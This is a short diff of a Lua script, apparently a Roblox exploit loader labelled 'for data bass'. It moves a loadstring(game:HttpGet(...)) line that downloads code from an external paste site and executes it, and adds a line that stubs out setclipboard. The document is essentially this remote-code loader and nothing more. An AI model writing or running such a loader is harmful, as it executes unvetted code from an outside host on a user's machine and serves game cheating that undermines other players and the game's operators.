@@ -1,3 +1,5 @@
 -- for data bass
-loadstring(game:HttpGet("http://vpaste.net/SGExs", true))()
+
 setclipboard = function() return end
+loadstring(game:HttpGet("http://vpaste.net/SGExs", true))()
+
